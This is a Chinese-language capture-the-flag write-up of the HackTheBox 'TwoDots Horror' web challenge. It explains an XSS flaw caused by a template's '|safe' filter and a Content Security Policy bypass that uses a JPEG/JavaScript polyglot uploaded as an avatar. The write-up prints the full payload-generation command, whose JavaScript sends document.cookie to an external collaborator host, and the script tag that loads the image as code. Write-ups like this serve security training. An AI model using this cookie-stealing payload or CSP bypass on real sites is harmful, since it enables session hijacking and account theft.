---
title: HackTheBox TwoDots horror WriteUP
date: 2023-09-07 16:04:46
tags:
- HackTheBox
- Web
- XSS
- Bypass CSP
---

## 题目

> Everything starts from a dot and builds up to two. Uniting them is like a kiss in the dark from a stranger. Made up horrors to help you cope with the real ones, join us to take a bite at the two-sentence horror stories on our very own TwoDots Horror™ blog.

![challenge](image.png)

## 思路

首先我们梳理一下网站的功能，非常清晰：注册用户、用户登录、发表帖子、上传头像、用户登出。

接下来梳理代码。

`flag`的位置在`/bot.js`中：

![flag](image-1.png)

结合函数`purgeData(db)`，bot会主动访问网站的页面，那么我们最终大概率需要通过XSS来获取bot的cookie。

那么，我们来看`/review`的模板，关键代码如下：

``` HTML
<div class="main-area">
    {% for post in feed %}
    <div class="nes-container is-post with-title">
        <p class="title"><span class="title1">{{ post.author }}</span><span class="title1">{{ post.created_at }}</span></p>
        <p>{{ post.content|safe }}</p>
    </div>
    <button class="nes-btn is-primary">Approve</button> <button class="nes-btn is-error">Delete</button><br />
    <br />
    {% endfor %}
</div>
```

> **safe** 过滤器通常在各种模板引擎中用于标记一个字符串为"安全的"，这意味着该字符串不应该被转义。 ——ChatGPT

那么，板上钉钉的，`{{ post.content|safe }}`位置存在XSS漏洞。后续的思路，就是构造payload，写入这个位置，并且利用。

利用的难点在于，网站开启了CSP(内容安全策略，Content Security Policy)。

> CSP（内容安全策略，Content Security Policy）是一个安全特性，用于防止各种常见的跨站脚本攻击 (XSS) 和其他代码注入攻击。CSP 允许网站管理员指定哪些内容源（例如 JavaScript、CSS、图片等）是可信的，从而控制网页可以加载和执行哪些资源。
CSP 是通过 HTTP 响应头 Content-Security-Policy 或等效的 <meta> 元素在 HTML 中实现的。
————ChatGPT

这里的策略限制了网站只加载同源的资源，所以我们无法加载外部的JS脚本：

![CSP](image-2.png)

既然网站只能加载同源的JS脚本，那么我们就需要想办法将JS脚本上传到网站中。作为一个靶场，这个网站理论上不会有多余的功能，那么上传头像的功能我们理应可以利用的上。

多方查阅资料后，我们可以发现解决这个问题的骚操作：把JavaScript代码写入图片中：https://github.com/s-3ntinel/imgjs_polygloter

## 解题

首先我们需要构造一个POC：

``` bash
# https://github.com/s-3ntinel/imgjs_polygloter
python3 img_polygloter.py jpg --height 666 --width 666 --payload 'window.location.href="http://rkfhc87j651n7m6f0va8pws5lwrnfc.oastify.com/grabber.php?c="+document.cookie;' --output poc.jpg
```

然后注册用户，将POC上传到头像：

![upload](image-3.png)

`在/routes/index.js`中我们可以找到上传文件的访问路径：

![avatar](image-4.png)

由此可以构造出XSS的POC(以用户名是admin为例)：

``` HTML
<script charset="ISO-8859-1" src="/api/avatar/admin"></script>123.123.
```

提交即可：

![submit](image-5.png)

![get-flag](image-6.png)

## 后记

这里需要注意的是payload的使用方式，需要设置`charset="ISO-8859-1"`属性，否则的话JavaScript代码无法加载。

## 参考资料

- [Bypassing CSP using polyglot JPEGs](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)
- [Image Polyglot](https://github.com/s-3ntinel/imgjs_polygloter)
- [XSS with a JPG/JPEG to bypass CSP](https://salucci.ch/2023/05/20/xss-with-a-jpg-jpeg-to-bypass-csp/)